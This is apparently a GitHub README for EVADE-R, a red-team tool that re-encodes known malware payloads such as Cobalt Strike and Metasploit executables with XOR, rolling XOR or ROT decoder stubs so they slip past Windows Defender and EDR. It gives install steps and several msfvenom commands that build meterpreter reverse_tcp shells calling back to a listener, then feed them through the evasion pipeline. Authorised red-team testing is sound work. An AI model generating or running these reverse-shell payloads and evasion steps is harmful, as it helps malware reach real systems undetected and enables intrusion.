<h1 align="center">
  EVADE-R
</h1>

<p align="center">
  <i>Evasion Validator and Automated Decoder Engine for Red-teaming</i><br>
  <b>EVADE-R</b> is a Red Team utility that transmutes known payloads into new forms designed to slip past antivirus and EDR defenses—without breaking functionality.
</p>

---

## What It Does

> Takes a known `.exe` payload → disassembles → obfuscates → recompiles → survives.

**EVADE-R** is an automated toolchain that:
- Accepts known malware signatures (e.g., Cobalt Strike, MSF payloads)
- Decompiles and extracts `.text` section shellcode
- Obfuscates shellcode via multiple encoding techniques (XOR, Rolling XOR, ROT)
- Rebuilds a working `.exe` with runtime decoder stubs
- Targets Windows Defender evasion

---

## Features

- Shellcode extractor  
- Multiple obfuscation techniques:
  - Simple XOR encoding with randomized key
  - Rolling XOR with multi-byte keys for enhanced evasion
  - ROT (byte rotation) encoding
- Runtime decoder stub injection  
- Minimal stub loader in C  
- Automated rebuild and output generation
- Command-line interface for automation  
- Support for both EXE and raw shellcode payloads  
- Looping & VT feedback (coming soon)  
- Junk injection and instruction substitution (planned)

---

## Setup

### Requirements
- Arch Linux (or other distro)
- `mingw-w64-gcc` (`sudo pacman -S mingw-w64-gcc`)
- Python 3.10+
- `capstone`, `lief`, `keystone-engine`

### One-Time Install

```bash
git clone https://github.com/godofthunder8756/evade-r.git
cd evade-r
chmod +x setup.sh run.sh
./setup.sh
```
## Usage

### Generate a detectable payload (example)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.5.0.59 LPORT=4444 -f exe -o payload.exe
```

Transform it with EVADE-R:

```bash
./run.sh payload.exe
```

This will:

- Extract and XOR-encode the shellcode
- Insert a runtime decoder stub
- Recompile into a new executable

You’ll find the results in:
```
artifacts/
└── payload/
    ├── EVADE_payload.exe              # Final obfuscated and rebuilt payload
    ├── obfuscated_disassembly.txt     # Human-readable disassembly with obfuscation
    └── text_section.bin               # Raw extracted .text section shellcode
``` 

## Ethical Use Only

This tool is provided strictly for ethical hacking, research, and red team training purposes.
Do not use EVADE-R on systems or networks you do not own or have explicit permission to test.

The creator assumes **no** responsibility for illegal or malicious use.

---

## Advanced Usage

### Command Line Options

EVADE-R now supports several command-line options for greater flexibility:

```bash
python msf_session.py -h
```

Available options:

```
  -h, --help            Show this help message and exit
  -c COMMAND, --command COMMAND
                        MSFVenom command to run
  -i INPUT, --input INPUT
                        Use existing payload file instead of generating new one
  -o OUTPUT, --output OUTPUT
                        Output filename
  -e {1,2,3}, --encoder {1,2,3}
                        Obfuscation method (1=XOR, 2=Rolling XOR, 3=ROT)
  --cleanup             Remove original payload file after obfuscation
  --no-interactive      Run in non-interactive mode with defaults
```

Environment variable:

- `EVADE_R_ARCH` (x86/x64) sets the default architecture for raw shellcode runs in `main.py` when stdin is non-interactive.

### Examples

```bash
# Direct command execution with specific encoder
python msf_session.py -c "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe" -e 2

# Process existing payload with custom output path
python msf_session.py -i payload.exe -o custom/path/stealth.exe -e 3

# Batch processing (non-interactive)
python msf_session.py -i payload.exe -e 1 --no-interactive --cleanup
```

### Obfuscation Techniques

1. **Simple XOR (Level 1)** - Basic XOR encoding with a random byte key
   * Good for basic signature evasion
   * Fastest processing speed

2. **Rolling XOR (Level 2)** - Multi-byte key XOR with rotating pattern
   * Better evasion against static analysis
   * Defeats simple XOR pattern detection

3. **ROT Encoding (Level 3)** - Byte rotation with random shift value
   * Alternative encoding method
   * Useful when XOR patterns are flagged

### Author

  Created by Aidan Ahern
